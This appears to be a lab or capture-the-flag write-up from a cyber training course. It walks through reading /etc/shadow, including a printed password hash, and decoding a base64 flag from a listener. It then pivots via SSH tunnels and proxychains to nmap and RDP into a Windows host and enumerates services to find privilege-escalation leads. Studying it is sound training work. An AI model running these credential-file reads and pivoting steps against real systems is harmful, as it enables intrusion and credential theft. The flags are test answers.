+   <summary><h4>Post - Intranet 5</h4></summary>
+
+Let's search `/etc/passwd`, `/etc/shadow`, and `/etc/group`.
+```
+cat /etc/shadow
+```
+At the bottom is our flag!
+```
+comrade:$6$TWu7qH0m$CX3CNvgib3ksGe6TxlHWjKiM3AE.Azur7lGtCU2QZJlBb2Do3YBjswJ0Zy2q9.xc2sJEofW38lJuGU1uLcInU1:19481:0:99999:7:::
+#F1aG = adCKGgHH535AwI5n5y7S
+```
+ </details>
+ <details>
+   <summary><h4>Post - Intranet 7</h4></summary>
+
+***
+Find the beacon being sent to the intranet host and determine how to interact with it in order to receive your flag.
+
+Your flag will be a unique string of twenty random characters.
+***HINT***: The message maybe encoded ==
+***
+Our host is being pinged. Let's look into at our network using `netstat -natup`
+
+
+
+
+There's our flag!
+```
+Listening on [0.0.0.0] (family 0, port 12335)
+Connection from 192.168.28.135 39636 received!
+dGppMHdTSXR2bE9EbE5iUEFQeHUK
+```
+Decode it from `base64` and you will get:
+```
+tji0wSItvlODlNbPAPxu
+```
+ </details>
+</details>
+</details>
+
+<details>
+  <summary><h1>Windows Exploitation</h1></summary>
+
+
+xfreerdp /u:student /v:127.0.0.1:21131 /dynamic-resolution +clipboard
+<details>
+  <summary><h4>Intro</h4></summary>
+
+**Objective**: Maneuver into the Donovian internal network, gain privileged access to discovered Windows host.
+
+**Tools/Techniques**: SSH and RDP masquerade into internal network with provided credentials. 
+Ports in use will be dependent on target location and are subject to change. 
+Windows techniques to gain privileged access such as DLL hijack, UAC bypass through weak paths,
+permissions, and tasks. Network scanning tools/technique usage is at the discretion of student.
+
+**Prior Approvals**: DLL hijack and UAC bypass, restarting of services through host reboot. 
+Host survey utilizing native command shells, which shell is at discretion of student.
+
+## Scheme of Maneuver:
+```
+>Jump Box
+->Pivot: 192.168.28.105
+-->T1: 192.168.28.5
+```
+
+#Target Section:
+
+***Pivot***
+```
+Hostname: ftp.site.donovia
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
+```
+
+***T1***
+```
+Hostname: donovian-windows-private
+IP: 192.168.28.5
+OS: Windows ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: 3389
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+```
+</details>
+
+<details>
+  <summary><h4>Priv - Vuln 1</h4></summary>
+
+***
+**INFO**:
+Analyze the System and identify the means to escalate your privileges. 
+Report the "status" of your finding by entering the correct **Display Name** for the **vulnerability** you found.
+***
+Our instuctions are to use this order to get to *T1*.
+```
+>Jump Box
+->Pivot: 192.168.28.105
+-->T1: 192.168.28.5
+```
+Now that we see this, we need to create a tunnel to the pivot through our *Jump Box*. 
+xfreerdp /u:student /v:127.0.0.1:21131 /dynamic-resolution +clipboard
+First, let's create our master socket tunnel to our jump box:
+```
+ssh -MS /tmp/jump student@<JUMP>  <-- BznOvkLSfBHB
+```
+Now create a tunnel to the *Pivot* box:
+```
+ssh -S /tmp/jump -O forward -L 21130:192.168.28.105:2222 a@1
+```
+Now connect to it using the credentials that were provided in our **INTRO**:
+```
+User: comrade
+Pass: StudentReconPassword
+------------------------------
+ssh -p21130 comrade@127.0.0.1 -D 9050 2>/dev/null
+
+> comrade@ftp:~$
+```
+Now that we have a connection, let's do an `nmap` scan on *T1*:
+```
+proxychains nmap -p- -sT -T5 -Pn 192.168.28.5
+```
+Results:
+```
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+5040/tcp  open  unknown
+5985/tcp  open  wsman
+5986/tcp  open  wsmans
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49672/tcp open  unknown
+```
+Let's check the *version* for all of them:
+```
+PORT    STATE SERVICE VERSION
+135/tcp open  msrpc   Microsoft Windows RPC
+139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
+445 -> gave issues
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+5040 -> Seg Fault
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5986 -> Seg Fault
+47001/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Others never brought a version back.
+```
+Turns out none of those were needed. Let's utilize the FG's commands since we have port *3389*. 
+```
+ssh -p21130 comrade@127.0.0.1 -L 21131:192.168.28.5:3389  <-- StudentReconPassword
+```
+Now let's get an RDP session running!
+```
+xfreerdp /u:comrade /v:127.0.0.1:21131 /dynamic-resolution +clipboard  <-- StudentPrivPassword
+```
+Check *services* without descriptions:
+```
+get-wmiobject system32_services | gm
+
+get-wmiobject system32_services | select name, description
+```
+The one's without a description:
+1.) LSM
+2.) MemoryStatus
+3.) NetSetupSvc
+
+To learn more about these *services*, let's use this command:
+```
+Get-CimInstance win32_service | select * | Where {$_.Name -eq "MemoryStatus"}
+```
+When looking for ***MemoryStatus***'s path, I found an interesting file named `memstatus` and it said:
+```
+Monitoring started.
+2147483647
+2147483647
+2147483647
+2147483647
+2147483647
+...
+```
+***MemoryStatus*** is our flag!
+</details
+</details>
